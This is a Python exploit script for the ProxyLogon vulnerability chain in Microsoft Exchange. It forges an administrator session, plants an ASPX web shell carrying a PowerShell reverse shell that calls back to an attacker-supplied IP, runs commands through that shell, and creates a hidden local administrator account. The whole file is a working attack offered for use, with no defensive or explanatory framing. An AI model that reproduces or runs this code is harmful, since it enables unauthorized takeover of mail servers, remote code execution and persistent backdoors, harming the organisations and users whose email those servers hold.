import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import sys

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

if len(sys.argv) < 3:
    print("Usage: python proxylogon.py <target> <email> <reverse_shell_ip>")
    print("Example: python proxylogon.py mail.example.com test@example.com 192.168.1.100")
    exit()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
target = sys.argv[1]
email = sys.argv[2]
reverse_shell_ip = sys.argv[3]
random_name = id_generator(4) + ".js"
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"

shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\test11.aspx"
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path

# Reverse shell content
reverse_shell_content = f'<script language="JScript" runat="server"> function Page_Load(){{var r=new ActiveXObject("WScript.Shell").Run("cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\"$client = New-Object System.Net.Sockets.TCPClient(\'{reverse_shell_ip}\',22445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\""); }}</script>'

autoDiscoverBody = f"""<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>{email}</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
"""

def log_error(message):
    print(f"[-] {message}")

def log_success(message):
    print(f"[+] {message}")

def make_request(method, url, headers=None, data=None, json=None, proxies=None):
    try:
        if method == 'GET':
            response = requests.get(url, headers=headers, verify=False, proxies=proxies)
        elif method == 'POST':
            response = requests.post(url, headers=headers, data=data, json=json, verify=False, proxies=proxies)
        else:
            raise ValueError("Invalid HTTP method")
        response.raise_for_status()
        return response
    except requests.exceptions.RequestException as e:
        log_error(f"Request to {url} failed: {e}")
        return None

print("Acquiring Exchange Server permissions for " + target)
print("=============================")
FQDN = "EXCHANGE01"
ct = make_request('GET', f"https://{target}/ecp/{random_name}", headers={"Cookie": "X-BEResource=localhost~1942062522", "User-Agent": user_agent}, proxies=proxies)

if ct and "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
    FQDN = ct.headers["X-FEServer"]
else:
    log_error("Failed to get FQDN from initial request.")
    exit()

ct = make_request('POST', f"https://{target}/ecp/{random_name}", headers={"Cookie": f"X-BEResource={FQDN}/autodiscover/autodiscover.xml?a=~1942062522;", "Content-Type": "text/xml", "User-Agent": user_agent}, data=autoDiscoverBody, proxies=proxies)

if not ct or ct.status_code != 200:
    log_error(f"Autodiscover Error! Status Code: {ct.status_code}")
    exit()

if "<LegacyDN>" not in str(ct.content):
    log_error("Cannot get LegacyDN!")
    exit()

legacyDn = str(ct.content).split("<LegacyDN>")[1].split(r"</LegacyDN>")[0]
log_success("Got DN: " + legacyDn)

mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

ct = make_request('POST', f"https://{target}/ecp/{random_name}", headers={"Cookie": f"X-BEResource=Administrator@{FQDN}:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;", "Content-Type": "application/mapi-http", "X-Requesttype": "Connect", "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}", "X-Clientapplication": "Outlook/15.0.4815.1002", "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456", "User-Agent": user_agent}, data=mapi_body, proxies=proxies)

if not ct or ct.status_code != 200 or "act as owner of a UserMailbox" not in str(ct.content):
    log_error("Mapi Error!")
    exit()

sid = str(ct.content).split("with SID ")[1].split(" and MasterAccountSid")[0]
log_success("Got SID: " + sid)
sid = sid.replace(sid.split("-")[-1], "500")

proxyLogon_request = f"""<r at="Negotiate" ln="john"><s>{sid}</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
"""

ct = make_request('POST', f"https://{target}/ecp/{random_name}", headers={"Cookie": f"X-BEResource=Administrator@{FQDN}:444/ecp/proxyLogon.ecp?a=~1942062522;", "Content-Type": "text/xml", "msExchLogonMailbox": "S-1-5-20", "User-Agent": user_agent}, data=proxyLogon_request, proxies=proxies)

if not ct or ct.status_code != 241 or 'set-cookie' not in ct.headers:
    log_error("Proxylogon Error!")
    exit()

sess_id = ct.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
msExchEcpCanary = ct.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
log_success("Got session id: " + sess_id)
log_success("Got canary: " + msExchEcpCanary)

ct = make_request('POST', f"https://{target}/ecp/{random_name}", headers={"Cookie": f"X-BEResource=Administrator@{FQDN}:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={sess_id}; msExchEcpCanary={msExchEcpCanary}", "Content-Type": "application/json; ", "msExchLogonMailbox": "S-1-5-20", "User-Agent": user_agent}, json={"filter": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}}, proxies=proxies)

if not ct or ct.status_code != 200:
    log_error("GetOAB Error!")
    exit()

oabId = str(ct.content).split('"RawIdentity":"')[1].split('"')[0]
log_success("Got OAB id: " + oabId)

oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId}, "properties": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "ExternalUrl": f"http://ffff/#{reverse_shell_content}"}}}

ct = make_request('POST', f"https://{target}/ecp/{random_name}", headers={"Cookie": f"X-BEResource=Administrator@{FQDN}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={sess_id}; msExchEcpCanary={msExchEcpCanary}", "Content-Type": "application/json; charset=utf-8", "User-Agent": user_agent}, json=oab_json, proxies=proxies)

if not ct or ct.status_code != 200:
    log_error("Failed to write the shell!")
    exit()

log_success("Success. Now verifying if the shell is OK!")
print("POST shell: https://" + target + "/owa/auth/test11.aspx")
shell_url = "https://" + target + "/owa/auth/test11.aspx"
print('code=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());')
print("Requesting shell...")
data = make_request('POST', shell_url, data={"code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"})

if not data or data.status_code != 200:
    log_error("Failed to write the shell")
else:
    log_success("Permissions as follows: " + data.text.split("OAB (Default Web Site)")[0].replace("Name                            : ", ""))

# Creating the user
print("Creating user exampleaccount...")
data = make_request('POST', shell_url, data={"code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"net user exampleaccount ExamplePassword123! /add\").StdOut.ReadAll());"})

if not data or data.status_code != 200:
    log_error("Failed to create the user")
else:
    log_success("User creation output: " + data.text.split("OAB (Default Web Site)")[0].replace("Name                            : ", ""))

# Adding the user to the Administrators group
print("Adding user exampleaccount to administrators group...")
data = make_request('POST', shell_url, data={"code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"net localgroup administrators exampleaccount /add\").StdOut.ReadAll());"})

if not data or data.status_code != 200:
    log_error("Failed to add the user to administrators group")
else:
    log_success("Add to administrators output: " + data.text.split("OAB (Default Web Site)")[0].replace("Name                            : ", ""))
